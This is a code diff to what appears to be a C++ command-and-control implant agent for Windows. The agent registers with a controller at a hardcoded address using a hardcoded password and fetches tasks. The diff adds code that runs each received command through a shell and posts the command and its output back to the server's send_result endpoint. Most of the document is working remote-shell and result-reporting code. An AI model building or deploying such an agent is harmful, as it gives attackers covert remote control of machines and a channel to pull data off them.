@@ -11,7 +11,8 @@ using json = nlohmann::json;
 LPCWSTR c2Domain = L"127.0.0.1";
 LPCWSTR registerURI = L"/agent/register";
 LPCWSTR testURI = L"test";
-LPCWSTR getTaskURI = L"/agent/send_task";
+LPCWSTR getTaskURI = L"/agent/get_task";
+LPCWSTR sendResultURI = L"agent/send_result";
 std::string password = "password";
 int port = 5000;
 
@@ -28,6 +29,19 @@ void executeCommands(std::vector<std::string> cmds) {
     for (int i = 0; i < cmds.size(); i++) {
         std::string result = exec_shell(&*cmds[i].begin());
         std::cout << result << std::endl;
+
+        json jsonResult = {
+            {"agent_id", 1234},
+            {"password", "password"},
+            {"command", cmds[i]},
+            {"result", result}
+        };
+
+        std::string jsonString = jsonResult.dump();
+
+        std::string response = httpPost(c2Domain, port, sendResultURI, jsonString);
+
+        std::cout << response << std::endl;
     }
     
 }
